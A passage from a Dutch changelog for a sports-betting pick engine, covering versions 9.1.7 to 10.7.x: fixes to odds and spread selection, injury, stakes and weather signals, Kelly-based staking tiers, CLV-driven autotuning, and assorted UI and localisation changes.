Hiermee geldt eindelijk de invariant: **meer brokers in pool kan NOOIT picks verwijderen die bij single-broker wél zouden doorgaan.**

### Removed
- Debug-log in MLB run-line scan (doel bereikt, log was tijdelijk).

## [10.7.9] - 2026-04-14

### Fixed
- `renderRecentBets` crashte op `Object.entries(c.markets)` als calib.markets null/undefined was. Defensive check toegevoegd.

## [10.7.8] - 2026-04-14

### Added
- "Wis alles" knop in notificatie-dropdown. Verwijdert alle eigen + globale notifications via nieuwe `DELETE /api/inbox-notifications` endpoint. Confirm-prompt voor accidental clicks.

## [10.7.7] - 2026-04-14

### Debug
- MLB run-line pool dump in scan log voor diagnose Dodgers-mysterie. Toont per game: preferredBookies, fpHome/fpAway, en exacte pool entries (`bookie:point@price` per side). Ook log wanneer `bestSpreadPick` null returnt zodat we weten of het edge of pool was.
- Tijdelijk; verwijderen na root-cause vastgesteld.

## [10.7.6] - 2026-04-14

### Fixed (KRITIEK — Dodgers-mysterie opgelost)
**Root cause**: `bestSpreadPick` checkte `maxOdds` (3.8) NA `bestFromArr(pool)`. Als de preferred-bookies pool een entry had met anomaal hoge odds op dezelfde point-line (bv Bet365 alternate run-line @ 4.50), dan:

1. `bestFromArr` returned die anomalie als max
2. `top.price > maxOdds` check → hele point-group geskipt
3. Unibet's legit 2.17 verloren ondanks dat die binnen [1.60, 3.80] zit

**Symptoom voor gebruiker**: Dodgers -1.5 @ Unibet 2.17 verscheen ALTIJD in Unibet-only scan, NOOIT in [Bet365+Unibet] scan. 10x reproduceerbaar.

**Fix**: per-entry pre-filter op [minOdds, maxOdds] vóór groeperen. Anomalieën worden weggegooid, legit entries blijven. Pool-grootte kan picks nu nooit verkleinen — meer brokers = altijd ≥ picks van enkelvoudige broker.

### Refactored
- 1H spread paden voor NBA + NFL ook op `bestSpreadPick` (was nog op oude pattern). Nu 7/7 sport-spread-paden uniform.

### Tests
- 190 passed. Voeg nog regressietest toe in volgende release: "preferred=[A,B] geeft ≥ picks van preferred=[A] over geconstrueerde testdata".

## [10.7.5] - 2026-04-14

### Fixed (reviewer-catch)
- **NHL + MLB spread**: nog op oude pattern `bestFromArr(homeSpr)` met label uit `homeSpr[0].point`. ±1.5-filter dempte de bug, maar label-mismatch was nog mogelijk (pick op Unibet -1.5 kon tonen als "-X" van andere bookie). Nu 5/5 sport-spread-paden uniform via `bestSpreadPick()`.

### Clarified (was misleidend in eerdere release-notes)
- **Stakes**: niet "logged-only" maar **scaffolded met weight=0 default**. Adj wordt gemultiplied met weight uit `signal_weights` store. Zolang CLV-autotune het signaal niet promoveert (weight blijft 0), effect is 0. Dit is bewust: als signaal werkt, promoveert het automatisch.
- **Weather (NFL + MLB)**: **actief vanaf dag 1**, geen weight-gating. Regen/wind past direct `overP` aan voor O/U totals (zoals football weather al deed). Dit is bewust: weer is een fysiek feit, niet een signaal dat CLV-validatie nodig heeft.

### Note
- Testsuite dekt nog niet dat alle sport-spreads `bestSpreadPick` gebruiken én dat "logged-only" signalen geen score-impact hebben bij weight=0. Regressietest komt in volgende release.

## [10.7.4] - 2026-04-14

### Debug
- Multi-sport injury logs tonen nu raw api-rows naast matched count: `🏀 NBA: 0 blessures geladen (0 teams, api returned N rows)`. Bij N=0 ligt het aan api-sports tier; bij N>0 maar 0 matched ligt het aan status-keywords die isInjured() niet matched.
- NHL injury-log toegevoegd (was vergeten in 10.7.1).

### Observaties na live-scan (gebruiker)
- Football injuries: 142 teams geladen ✓ (was 0 voor 10.7.0)
- Pre-fetch skipte 50/59 inactieve competities ✓
- Call-reductie: ~40% vs vorige scans ✓
- Multi-sport injuries: 0 across all — root cause nog te bepalen (api-sports tier of status-naming). Debug-log helpt dit isoleren in volgende scan.

## [10.7.3] - 2026-04-14

### Changed (ALLOWED_BKMS dynamisch)
- Football scan gebruikte hardcoded `['bet365', 'unibet']` voor consensus-filtering. Nu: user's `preferredBookies` + altijd Pinnacle/William Hill als sharp refs. Fallback naar brede trusted set (7 bookies) als user geen voorkeur heeft.
- Gevolg: markt-consensus wordt breder en sharper, en toevoegen van nieuwe bookies (BetCity, TonyBet) werkt automatisch zonder code-change — zodra in preferredBookies, counten ze mee.

### Added (weather signal — NFL + MLB)
- **NFL**: outdoor stadia krijgen nu weer-data. Regen >5mm = -3% Over, wind >30km/h = -2.5% Over (komt samen in `overP` berekening).
- **MLB**: outdoor parks idem (regen >5mm = -2.5%, wind >25km/h = -2%). Kleiner dan NFL omdat baseball minder stil gelegd wordt bij wind.
- Weather-tag in `matchSignals` voor CLV-autotune, `weatherNote` in `sharedNotes` voor UI.
- Max weather-calls per scan gerespecteerd (existing `MAX_WEATHER_CALLS` cap).
- Voor indoor sports (basketball, hockey, handball) niet relevant → niet geïmplementeerd.

## [10.7.2] - 2026-04-14

### Added (multi-sport stakes signal)
- `calcStakesByRank(rank, totalTeams, sport)` — rank-based stakes-detectie per sport met sport-specifieke playoff/relegatie drempels:
  - **NBA/NHL**: top 20% = titelrace, top 50% = playoff-strijd, bottom 20% = onderaan
  - **MLB**: top 17% = titelrace, top 33% = playoff, bottom 17% = onderaan
  - **NFL**: top 25% = titelrace, top 44% = playoff, bottom 25% = onderaan
  - **Handball**: top 20% = titelrace, top 40% = euro-strijd, bottom 20% = degradatie
- Picks krijgen nu een `stakes` signal tag met adj-verschil tussen home/away. Weight start op 0 (logged-only), auto-promote via CLV als het signaal bewezen voorspellend is.
- Football had al `calcStakes` via gap-based logica; blijft zo voor preciezere detectie met punt-gaps.

## [10.7.1] - 2026-04-14

### Added (multi-sport injuries — scaffolding, conservatief)
- `isInjured()` universele status-matcher: telt `out`, `doubt(ful)`, `question(able)`, `day-to-day`, `IR`, `injured`, `suspen(ded)`. Niet: `probable`, `healthy`, `active`, `resting`. Conservatief ("zekere voor onzekere").
- **NBA `nba_injury_diff`**: nieuw signal via `/injuries` endpoint, weight=0 (logged-only), wordt auto-geactiveerd via CLV-autotune zodra n≥50 + CLV>0%. 0.6% per blessure-verschil bij weight 1.0.
- **NHL `nhl_injury_diff`**: idem, 0.5% per verschil.
- **MLB `mlb_injury_diff`**: idem, 0.3% per verschil (pitcher is dominant in baseball, overige blessures minder impactvol).
- **Handball `handball_injury_diff`**: idem, 0.7% per verschil (kleinste roster = grootste impact per blessure).
- **NFL** bestaande injury-signal geharmoniseerd met `isInjured()` helper.
- Scan-output toont nu per competitie: `🏀/🏒/⚾/🏈/🤾 League: N blessures geladen (M teams)` voor transparantie.

### Next
- Stakes signal (playoffs/degradatie/titel/niets te spelen) per sport via rank/seizoen-progressie.

## [10.7.0] - 2026-04-14

### Fixed (KRITIEK — silent bugs gevonden tijdens scan-audit)
- **Blessures werden nooit opgehaald**: STAP 2 in `enrichWithApiSports` filterde op `k.startsWith('soccer')` maar AF_LEAGUE_MAP keys zijn `'epl'`, `'laliga'`, `'egypt'` etc (géén `'soccer_'` prefix). Filter returnde 0 items → loop liep nul keer → `afCache.injuries` altijd leeg. Blessure-signaal heeft dus al maanden geen impact gehad op picks. Nu: iterate AF_LEAGUE_MAP direct.
- **Referee pre-cache eveneens kapot**: STAP 3 gebruikte hardcoded `'soccer_epl'`, `'soccer_spain_la_liga'` → `AF_LEAGUE_MAP[key]` = undefined → skip. Ref-data kwam nog via `f.fixture?.referee` fallback, maar pre-caching deed niks. Nu: correct keys (`'epl'`, `'laliga'`, `'bundesliga'`, `'seriea'`, `'ligue1'`, `'eredivisie'`).

### Optimized (football scan efficiency)
- **Pre-fetch fixtures**: nieuwe `preFetchFootballFixtures()` draait vóór `enrichWithApiSports`. Bouwt `activeSoccerKeys` Set met alleen leagues die matches hebben in de scan-window. Standings/injuries/referees worden nu alleen opgehaald voor die leagues.
- **Impact**: bij 13 actieve leagues uit 59 worden ~46 standings + 46 injury calls geskipt per scan. Fixtures zijn vooraf gecached zodat main scan loop ze niet opnieuw fetcht. Netto ~40% minder API calls per scan.
- **"X scans resterend"** op homepage blijft correct (leest uit cumulatieve `callsToday`).

### Pending (next)
- Multi-sport enrichment uitbreiden: referee/injuries/standings/weather/stakes voor NBA/NFL/NHL/MLB/handball is nu nog incompleet.
- "Stakes" signal (titelrace/degradatie/Europa-strijd) doorvoeren naar alle sports.

## [10.6.6] - 2026-04-14

### Fixed (KRITIEK — spread/handicap mixing-points bug in ALLE sports)
- **Oorzaak**: `homeSpr = spreads.filter(side==='home')` gaf ALLE point-lines terug in één array. `bestFromArr(homeSpr)` pakte vervolgens de hoogste prijs ongeacht point-line. Gevolg: een bookie met -3.5 @ 4.20 wint van dezelfde sport met -1.5 @ 2.17, en check `price <= 3.8` gooide de hele pick weg.
- **Gevolg voor gebruiker**: Dodgers -1.5 @ Unibet 2.17 (7/10 pick) verscheen wel in Unibet-only scan (pool uniform op -1.5) maar NIET in [Bet365+Unibet] scan (waar Bet365's extreme run line de pool contamineerde).
- **Fix**: Nieuwe module-helper `bestSpreadPick(spreads, fairProb, minEdge)` groepeert per point, runt `bestFromArr` per point-groep, pakt beste edge-qualifying. Toegepast op MLB run line, NHL puck line (beide met extra `±1.5` filter want vaste standard), NBA spread, NFL spread, handball handicap.
- **Secundaire fix**: label `homeSpr[0].point` was niet gekoppeld aan best.price — kon "Dodgers -1.5" tonen terwijl best eigenlijk Dodgers -2 was. Nu toont label het point van de daadwerkelijke best-pick.

## [10.6.5] - 2026-04-14

### Fixed (kritiek)
- **Odds-alert dedup bleef triggeren bij zelfde drift**: oorzaak was race-condition bij Render-restart — `loadCalib()` sync kon DEFAULT_CALIB returnen voor Supabase-cache warm was, waardoor saveCalib de hele calibratie overschreef (inclusief oddsAlerts). Nu: `loadCalibAsync()` aan begin van elke run (hot cache), één batch-write aan eind (geen N-writes per bet), fail-safe op lege calib.

### Added (actionable todos)
- `evaluateActionableTodos()` draait dagelijks na resultaten-check. Inserteert sticky inbox-items voor beslissingen die actie vragen, idempotent (checkt of todo-type al bestaat). Eerste todo: **Render upgrade** bij ≥100 settled bets + avg CLV > 0%. Blijft unread tot user mark-read klikt. Framework uitbreidbaar voor meer todos (bv BetCity bij €2k bankroll).

## [10.6.4] - 2026-04-14

### Fixed (kritiek)
- **`bestOdds` negeerde preferredBookies**: tweede best-odds-helper (gebruikt in football Moneyline path `server.js:4967-4969`) filterde niet op preferredBookies, alleen `bestFromArr` wel. Gevolg: football ML-picks toonden bookie/prijs van ELKE bookie in de markt, niet alleen jouw voorkeur. Nu geharmoniseerd: beide functies respecteren `_preferredBookiesLower`.
- **Odds monitor dedup verloor state bij Render-sleep**: `lastAlerts` Map was in-memory → free-tier sleep = Map gewist = re-alert zelfde drift. Nu persistent via `calib.oddsAlerts` (Supabase + disk), met 24u cleanup van stale entries.

## [10.6.3] - 2026-04-14

### Added (one-shot reminder)
- Bet365-limit reminder in `/api/notifications`: toont tussen 19-26 apr 2026 een inbox-alert als Bet365 nog niet terug in `preferredBookies` staat. Code getagd met `// TODO: remove after 2026-04-26`, self-expiring via date-window.

## [10.6.2] - 2026-04-14

### Fixed
- **Dashboard flash voor login**: inline `<head>`-script redirect direct naar `/login.html` als `ep_token` mist. Rendert geen body meer zonder auth.
- **Odds monitor spam**: geen dedup → elke 60 min zelfde alert bij stabiele drift. Nu: in-memory `lastAlerts` Map per bet, re-alert alleen bij Δ ≥3pp drift, richtingswissel (sharp↔fade), of ≥4u na laatste alert. Persistent sharp-moves krijgen alsnog een 4u-heartbeat.

## [10.6.1] - 2026-04-14

### Fixed
- **`/api/notifications` 500**: server crashte op `entry.oldMult.toFixed(2)` bij modelLog entries zonder oldMult/newMult (milestone, signal_tuning, insight types). Nu type-guarded met `hasMult` check, identiek aan frontend fix in v10.3.0.
- **CSP source-map error**: Chart.js probeerde `chart.umd.js.map` op te halen van cdn.jsdelivr.net, geblokkeerd door `connect-src 'self'`. Toegevoegd: `https://cdn.jsdelivr.net` aan connect-src (zelfde origin waarvan we al script laden).
- **Deprecated meta-tag warning**: `<meta name="mobile-web-app-capable">` toegevoegd naast bestaande `apple-mobile-web-app-capable` (Chrome 95+ requires modern tag).

## [10.6.0] - 2026-04-14

### Changed (codebase split)
- `index.html` van 4768 → 4266 regels (-502): LANG dict + `t()`/`applyLanguage()` verhuisd naar `/js/lang.js` (434 regels), AUTH section (`api()`, `getToken()`, `logout()`, `initUserUI()`, push-registratie) naar `/js/auth.js` (70 regels).
- `<script>`-tags toegevoegd vóór de inline JS zodat lang/auth eerst laden — classic-script realm zorgt voor shared top-level scope, 125 `t()` call-sites resolven correct bij runtime.
- `.js` toegevoegd aan `ALLOWED_EXTENSIONS` in server.js + lib/config.js zodat Express static handler de nieuwe files serveert.
- Service worker (`sw.js`) gebruikt geen `caches.open`, dus geen cache-invalidation nodig.
- Tests: 190 passed, 0 failed. Syntax-check op lang.js + auth.js + server.js clean.

### Notes
- Next sessions: verdere splits (pages, live, modals) mogelijk als dit stabiel blijkt. Voor nu conservatief: LANG + auth zijn de zelfvoorzienende modules met duidelijkste grenzen.

## [10.5.3] - 2026-04-14

### Added (Phase 4 i18n)
- ~30 LANG keys (NL + EN) voor toasts, modals, errors: `err_prefix`, `err_network`, `err_connection`, `err_load_failed`, `err_fetch_failed`, `err_unknown`, `err_model_log`, `err_v2_load`, `err_password_empty`, `err_add_bet_empty`, `err_odds_empty`, `loading`, `loading_dots`, `loading_fetch`, `busy`, `confirm_remove_bet`, `confirm_clv_backfill`, `drift_title`, `drift_no_data`, `action_enable`, `action_disable`, `btn_close_live`, `prompt_new_odds`, `prompt_new_units`, `prompt_sport`, `prompt_bookie`, `fill_times_btn`, `bets_updated`, `bets_not_found`.
- Hardcoded NL strings in bet-edit prompts, CLV backfill confirm, operator toggle confirms, password change, loadSupabaseUsage, loadV2Dashboard, toggleOp, loadDriftView, checkResults, backfillTimes, recalcWL, toggleForm, toggleLive vervangen door `t()` calls met placeholder-substitutie waar nodig (`{id}`, `{val}`, `{list}`, `{window}`).

### Note
- Initial-state "Laden..." HTML op 7 plekken (notif-body, dash-quote, rb-list, signal-analysis, experimental-signals, model-log-body, page-settings) blijft static NL. Content wordt overschreven door `loadX()` na login, dus geen zichtbare impact op EN-gebruiker.

## [10.5.2] - 2026-04-14

### Removed (clutter)
- Onboarding tour (`TOUR_STEPS`, `startTour`, `restartTour`, tour-overlay, tour-tooltip HTML/CSS). Reden: werkte niet lekker en voegde niets toe.
- Help-tip tooltips ("?"-icoontjes op Bankroll/ROI/Strike rate/CLV/Variance/Score/Edge). Reden: clutter op dashboard, user kent de metrics al.
- Bijbehorende LANG keys (`tour_*`, `help_*`, `card_tour*`), CSS (`.help-tip`, `.help-text`, `.tour-*`), JS (`injectPickCardHelpTips`, `_origInitUserUI` tour hook).

### Added (Info tab i18n)
- `info_intro`, `info_model_body`, `info_subtitle`, `info_date` keys met NL + EN vertaling via `data-i18n-html`.
- Card header "april 2026" is nu taalgevoelig → "April 2026" in EN.

## [10.5.1] - 2026-04-14

### Changed (score/unit alignment)
- `kellyToUnits()` brackets aangescherpt zodat score 6/10 max 0.75U triggert (was 1.0U). Nieuwe mapping raw-Kelly%: 0.3U <3% · 0.5U 3-6% · 0.75U 6-10% · 1.0U 10-14% · 1.5U 14-20% · 2.0U >20%.
- Inzetstrategie-kaart labels bijgewerkt (€-bedragen identiek, alleen Kelly% ranges).
- Frontend `recUnits` helper in bet-edit modal aligned met nieuwe tiers.
- Reden: half-Kelly + pre-CLV fase vraagt conservatievere staking; auto-stepup en signal-tuning pushen winnende markten vanzelf omhoog als CLV bewijst.

### Tests
- 190 passed (kellyToUnits tier tests ge-refactored naar nieuwe grenzen).

## [10.4.1] - 2026-04-14

### Added (NBA + NFL signal scaffolding — volledig autonoom)
- **NBA `nba_rest_days_diff`**: per scan +2 extra api-sports calls per league (-2, -3 dagen). Berekent rest_days verschil home vs away (1/2/3/4+). Logged in matchSignals + feature_snapshots als `rest_days_home/away/diff`.
- **NFL `nfl_injury_diff`**: per scan +1 api-sports call per league (`/injuries`). Telt out/doubtful/questionable per team. Logged als `injury_count_home/away/diff`.
- **Auto-activatie pipeline**: beide signalen starten op weight=0 (geen scoring impact). `autoTuneSignalsByClv` v10.4.0 auto-promote-from-zero (n≥50 + CLV>0% → weight 0.5) activeert ze automatisch zodra bewezen. Telegram + inbox notification bij activatie. Geen handmatige actie nodig.
- Adj-formules in NBA/NFL scan vermenigvuldigen nu signal-adj × weight → bij weight=0 geen effect, bij weight 0.5+ proportionele invloed.

### Changed
- NBA scan kost ~3 calls extra per league per dag (was: 1 yesterday-call → nu yesterday + -2 + -3)
- NFL scan kost ~1 call extra per league per dag (injuries fetch)

## [10.4.0] - 2026-04-14

### Added (autonome model-evolutie)
- **Kelly-fraction auto-stepup**: KELLY_FRACTION nu dynamisch (default 0.50, max auto 0.75, step 0.05). Verhoogt automatisch bij avg CLV > 2% + ROI > 5% over laatste 200 bets, geen kill-switch in laatste 30d, cooldown 30d. Persistent in calibration store. Telegram + inbox notification bij elke stap. Volledige Kelly (>0.75) vereist handmatige override.
- **Auto-promote signal**: signalen op weight=0 die n≥50 picks halen met avg CLV > 0% worden automatisch geactiveerd op 0.5 (logged-only → live). Symmetrisch met bestaande mute-logic.
- **Status page extended**: 9 services in plaats van 5. Web Push (VAPID), MLB StatsAPI, NHL public API, open-meteo toegevoegd. Gratis APIs tonen ∞ icoon naast plan-naam.
- **Backtest-gate residual model**: `residualModelActive(n, validationStats)` accepteert nu walk-forward Brier-delta. Activatie alleen als delta < 0 (residual model verbetert calibratie).

### Changed
- **RESIDUAL_MIN_TRAINING_PICKS**: 500 → 100. Reden: bij 2 bets/dag was 500 onbereikbaar in praktijk. Backtest-gate vangt overfitting risk.
- **KELLY_FRACTION** is geen const meer maar dynamische runtime-state via `getKellyFraction()`/`setKellyFraction()`. Backwards-compat alias behouden.
- `lib/picks.js` + `server.js` (2x inline) gebruiken nu `getKellyFraction()` ipv hardcoded import.

### Tests
- 190 passed (1 nieuwe: backtest-gate residualModelActive)
- residualModelActive threshold-test bijgewerkt naar 100

## [10.3.1] - 2026-04-14

### Changed (unit sizing granularity)
- `kellyToUnits()` uitgebreid van 3 → 6 tiers: 0.3U / 0.5U / 0.75U / 1.0U / 1.5U / 2.0U
- Brackets in raw-Kelly%: <3% / 3-5% / 5-8% / 8-12% / 12-18% / >18% (half-Kelly intern)
- Inline duplicaten in server.js + lib/picks.js verwijderd → roepen nu kellyToUnits aan (geen drift meer)
- Inzetstrategie UI toont alle 6 tiers met euro-bedragen (€7,50 t/m €50 bij 1U=€25)
- Signal Attribution verhuisd van Data → Model tab (model-state, geen user analytics)
- 6 tests toegevoegd voor nieuwe tiers (189 totaal)

## [10.3.0] - 2026-04-14

### Changed (IA reorganisatie)
- Nieuwe **Model**-tab (admin-only): signal gewichten, markt multipliers, per-sport, model updates samen
- **Inbox** uitgekleed tot puur notificatie-feed (geen overlap meer met data/model)
- **v2 Pipeline Health** verhuisd van Inbox → Status (operational health centraal)
- **Model updates** verhuisd van Info → Model
- `loadInbox()` gesplitst in `loadInbox()` + `loadModelTab()` + `loadAppVersion()`

### Fixed
- Light-mode WCAG contrast: yellow `#f59e0b`→`#b45309`, green `#10b981`→`#047857`, red `#ef4444`→`#b91c1c` (alle 5:1+ AA)
- Model-log renderer crashte op milestone/signal_tuning/insight entries zonder oldMult/newMult — nu type-aware

### Docs
- Info-tab: model uitgelegd herschreven naar quantitative market-disagreement framing
- Databronnen: MLB StatsAPI, NHL public API, OpenWeatherMap, Supabase toegevoegd
- Abonnementen: deprecated rijen + gratis API-bundle verwijderd, sectie toont reële kosten + Render free
- Inzetstrategie: €500 startkapitaal, 1U=€25, max 1/match, max 2/sport, adaptive 5.5-8%, bootstrap tot 100 bets

## [10.2.2] - 2026-04-14

### Added (autonomy completion)
- Inbox notifications bij model-update (CLV autotune signal weight wijzigingen)
- Inbox drift alerts: dagelijkse check van markten met recente CLV verslechtering ≥2%
- 5 notification types totaal: kill_switch, model_update, drift_alert + Telegram CLV milestone + drawdown

## [10.2.1] - 2026-04-14

### Changed (reviewer pivot: observability > bedienbaarheid)
- Operator failsafes vereenvoudigd naar minimal set (master_scan_enabled, market/signal_auto_kill, panic_mode, max_picks_per_day)
- Dashboard UI: 5 toggle-knoppen ipv uitgebreide cockpit
- Panic mode in scan: max 2 picks + alleen PROVEN markten + max 1 per sport
- Drift endpoint: multi-window 25/50/100 vs all-time, per markt+signal+bookie, met sample size + alert min_n

### Added
- `GET/POST /api/admin/v2/operator` — minimale failsafe toggles
- `top_contributions` (top 5 ranked) in why-this-pick attributie
- Datakwaliteit: oldest_feature_snapshot_age_min + avg_bookmaker_count + avg_quality_score

## [10.2.0] - 2026-04-14

### Added (model control, reviewer-roadmap)
- `GET /api/admin/v2/drift?recent=N` — drift detection per markt + signal
- `GET /api/admin/v2/why-this-pick?bet_id=X` — pick attribution + lineage
- `GET /api/admin/v2/data-quality?hours=N` — quality flag aggregaties
- Dashboard UI knoppen: kill-switch toggle, refresh, autotune trigger, drift view

## [10.1.5] - 2026-04-14

### Added
- Bootstrap mode in adaptive MIN_EDGE: bypass per-markt tiers tot ≥100 totaal settled bets
- Voorkomt strangulatie van data-collectie tijdens eerste weken

## [10.1.4] - 2026-04-14

### Fixed (reviewer-advies)
- Adaptive MIN_EDGE gate sluit ook combiPool: geen combo-legs op onbewezen markten

## [10.1.3] - 2026-04-14

### Added
- `autoTuneSignalsByClv()` draait nu dagelijks automatisch na results-check (was alleen via endpoint)
- Alle disciplinemechanismen volledig dynamisch: kill-switch refresh 30 min, adaptive MIN_EDGE 30 min, signal stats dagelijks, CLV autotune dagelijks

## [10.1.2] - 2026-04-14

### Fixed (3e externe code-review)
- HIGH: `/api/picks` lekte ruwe modeldata; nu safePick filter (zelfde als scan-history/analyze)
- MEDIUM: CLV milestone alert nu per markt breakdown (≥10 samples per markt)
- LOW: UX-tak voor 0/1-2 picks ('kwaliteit boven volume' bevestigend signaal)

## [10.1.1] - 2026-04-14

### Added
- Inbox notifications voor kill-switch events (nieuwe blokkades, herstellingen, scan-blocks)

## [10.1.0] - 2026-04-14

### Added (profit-focus)
- **Adaptive MIN_EDGE in scan-pad**: mkP() filtert nu picks onder UNPROVEN/EARLY threshold
- `GET /api/admin/v2/per-bookie-stats`: ROI/CLV per bookmaker
- CLV health alerts via Telegram (elke 25 nieuwe settled CLV bets)
- Soft drawdown alert (geen pause, alleen warn) bij <-15% over 7d

## [10.0.3] - 2026-04-14

### Added
- Signal-level kill-switch: avg CLV ≤ -3% over ≥50 samples → weight = 0
- Adaptive MIN_EDGE helper (3 tiers: PROVEN/EARLY/UNPROVEN)

## [10.0.2] - 2026-04-14

### Fixed
- HIGH: model IP-leak via `/api/scan-history` en `/api/analyze` (safePick whitelist)
- MEDIUM: POTD diversification bypass (selected:true/false flag)
- LOW: ontbrekende Content-Security-Policy header

## [10.0.1] - 2026-04-14

### Fixed (2e externe code-review)
- Kill-switch enforcement (was alleen detection)
- Diversification: max 1 pick/match, max 2 per sport
- afGet timeout via AbortController (8s)
- Scan history bewaart nu allPicks (audit)

## [10.0.0] - 2026-04-14

### Major release: complete v2 architecture
EdgePickr is gepivotteerd van "scan-app met calibratie" naar een echte
**quantitative market-disagreement engine** met point-in-time snapshots,
residual modeling boven market consensus, en self-learning via CLV.

### Added (v2 completion)
- `signal_stats`, `execution_logs`, `training_examples`, `raw_api_events` tabellen (4 reviewer-tabellen die in v9.10 nog ontbraken)
- Signal stats dagelijkse refresh job: aggregeert avg CLV/PnL/lift per signal
- Training examples writer: koppelt feature_snapshots aan settled outcomes voor latere model training
- Execution logs schema voor toekomstige bookie-API slippage tracking
- `POST /api/admin/v2/training-examples-build` — bouw training set uit settled bets
- `GET /api/admin/v2/signal-performance` — historische signal stats per signal_name

### Architecture
- 11/12 reviewer-tabellen geïmplementeerd (12e = bets, was al aanwezig)
- 7-layered pipeline: ingest → feature store → consensus → model → pick engine → execution → learning
- Pure helpers in `lib/model-math.js` (geen test-mirrors meer)
- Snapshot writers in `lib/snapshots.js` (allemaal fail-safe)

### Migration
- `migrations/v10.0.0_v2_completion.sql` — laatste 4 tabellen

### Tests
- 171/171 pass (3 nieuwe security regressies + clamp validatie)

## [9.10.0] - 2026-04-14

### Added
- **Per-signal CLV autotune** (`autoTuneSignalsByClv`): pas signal weights aan o.b.v. avg CLV ipv W/L (sneller signal). `POST /api/admin/v2/autotune-clv`
- **Kickoff-window polling** (t-6h/t-1h/t-15m): elke 5 min check fixtures binnen ±5 min van die kickoff-relatieve momenten, schrijf snapshot
- **Auto-retraining scheduler**: wekelijkse check of (sport,markt) ≥500 candidates heeft, log kandidaten voor residual training. Echte training-pipeline placeholder (TODO).
- **Frontend admin v2 dashboard** in inbox: snapshot counts, pick candidates, CLV per sport, walk-forward, kill-switch

### Changed
- Inbox krijgt nieuwe "🧪 v2 Pipeline Health" kaart met refresh-button

## [9.9.0] - 2026-04-14

### Added
- **Kill-switch enforcement** met auto-disable bij avg CLV < -5% over ≥30 settled bets
- **Walk-forward backtest** endpoint: Brier + log loss + calibration buckets per sport
- **Hierarchical calibration** met Bayesian smoothing (global → sport → market → league)
- **Residual model framework** skeleton (logistic regression delta, activeert bij ≥500 picks/markt)
- Admin endpoints: `/api/admin/v2/kill-switch`, `/api/admin/v2/walkforward`

### Changed
- Architectuur opgeschoond: images naar `img/`, docs naar `docs/`

### Tests
- 9 nieuwe (169 totaal): hierarchical multiplier clamping, residual sigmoid, sample-size threshold

## [9.8.0] - 2026-04-14

### Added
- `/api/admin/v2/clv-stats` endpoint: per sport + (sport, markt) bucket → avg CLV%, % positief, total PnL
- Kill-switch eligibility detection: WATCHLIST tier (-5% < CLV < -2%) en AUTO_DISABLE (CLV < -5%)
- CLV als hoofd-KPI (winrate is te noisy bij kleine samples)

## [9.7.1] - 2026-04-14

### Added
- Pick candidates voor alle 6 sporten (basketball, baseball, NFL, handbal, football)
- `recordMl2WayEvaluation` helper voor 2-way ML pattern hergebruik
- Admin endpoints `pick-candidates-summary` en `snapshot-counts`

## [9.7.0] - 2026-04-14

### Added (Sprint 2: Pick Pipeline)
- `model_versions`, `model_runs`, `pick_candidates` Supabase tabellen
- Hockey scan schrijft model_run + pick_candidates met expliciete rejected_reason categorisatie
- Helpers: `registerModelVersion`, `writeModelRun`, `writePickCandidate`

### Migration
- `migrations/v9.7.0_v2_pick_pipeline.sql`

## [9.6.1] - 2026-04-14

### Added
- Football snapshot integratie (1X2 consensus, h2h canonicalisatie)
- Fixture snapshot polling job (elke 90 min, 30 fixtures cap)

## [9.6.0] - 2026-04-14

### Added (Sprint 1: v2 Foundation)
- 4 snapshot tabellen: `fixtures`, `odds_snapshots`, `feature_snapshots`, `market_consensus`
- `lib/snapshots.js` met fail-safe writers (Supabase-down = scan gaat door)
- Integratie in alle non-football scans
- Quality scores (bookmaker count + overround penalty)

### Migration
- `migrations/v9.6.0_v2_foundation.sql`

## [9.5.0] - 2026-04-14

### Refactor
- Pure helpers naar `lib/model-math.js` zodat tests echte productie-code testen (geen mirrors meer)
- NHL shots-differential signal via `api-web.nhle.com` (publiek, gratis)

### Added
- `shotsDifferentialAdjustment`: SF% diff × 0.45, clamped ±3%, vereist ≥20 GP

## [9.4.1] - 2026-04-14

### Fixed (uit externe code-review)
- 2FA verify-code controleert nu account.status (blocked/pending) vóór JWT
- Scheduler slaat handles op in userScanTimers[admin.id] → geen dubbele scans
- PUT /api/bets/:id herberekent wl bij odds/units edit van settled bet

## [9.4.0] - 2026-04-14

### Added
- Hockey team totals via Poisson (📈/📉)
- Voetbal Double Chance (1X/X2/12) afgeleid uit 1X2 consensus
- MLB starting pitcher signal via `statsapi.mlb.com` (free public API)
- F5 (1st 5 innings) markt parser + pick generation met pitcher 3x versterkt

## [9.3.0] - 2026-04-14

### Added
- **Market-derived probability toolkit**: `devigProportional`, `consensus3Way`, `deriveIncOTProbFrom3Way`, `modelMarketSanityCheck` — allemaal getest (26 nieuwe unit tests, 108/108 totaal).
- **Model-vs-market sanity check** voor NHL 2-way ML: pick wordt alleen getoond als model-prob binnen 4% van market-derived inc-OT prob zit. Voorkomt dat we picks op overschatte edges plaatsen.
- **Sanity check op 3-way Poisson picks** (hockey + handbal): devigged market 3-way consensus vergeleken met Poisson output. Skip bij divergentie > threshold.

### Changed
- NHL 2-way ML terug actief, maar met dubbele guardrail: (1) bookie moet OT-inclusief zijn (Bet365/Pinnacle/DK), (2) market-sanity check moet passen.
- `NHL_OT_HOME_SHARE = 0.52` en `MODEL_MARKET_DIVERGENCE_THRESHOLD = 0.04` als expliciete defaults — later dynamisch uit settled bets te calibreren.

### Technical
- Pure helpers gemirrord in `test.js` voor isolated testing.
- Safety: alle nieuwe helpers geven null bij invalid input, handle stringified numbers, renormalize non-normalized probs.

## [9.2.1] - 2026-04-14

### Fixed
- NHL 2-way ML (incl-OT) tijdelijk uitgeschakeld omdat api-sports feed "Home/Away" ambigu was tussen 60-min-met-push en inc-OT.
- ML parser strict: alleen bet-id 1 met exact 2 values {Home, Away} wordt als 2-way ML herkend.

## [9.2.0] - 2026-04-14

### Changed
- **Preferred-bookies edge-evaluatie**: `bestFromArr` filtert nu op user's preferredBookies. Edges worden berekend met alleen odds van jouw bookies; consensus blijft uit alle bookies (market-truth).
- **Final-only rendering**: picks verschijnen pas als hele scan klaar is (geen flicker meer van football-first dan multi-sport-update).

### Removed
- Live scan uit prematch flow (was legacy). Geen "Live check geen situaties" telegram meer.

## [9.1.8] - 2026-04-14

### Fixed
- Hockey 2-way ML filter: bookie-selectie gebeurt nu VOOR `bestFromArr` ipv erna. Voorkomt dat Unibet hoogste prijs had en de hele pick dropt.

## [9.1.7] - 2026-04-14

### Added
- **Settings → Bookies**: toggle checkboxes voor welke bookies je gebruikt. Default: Bet365 + Unibet.
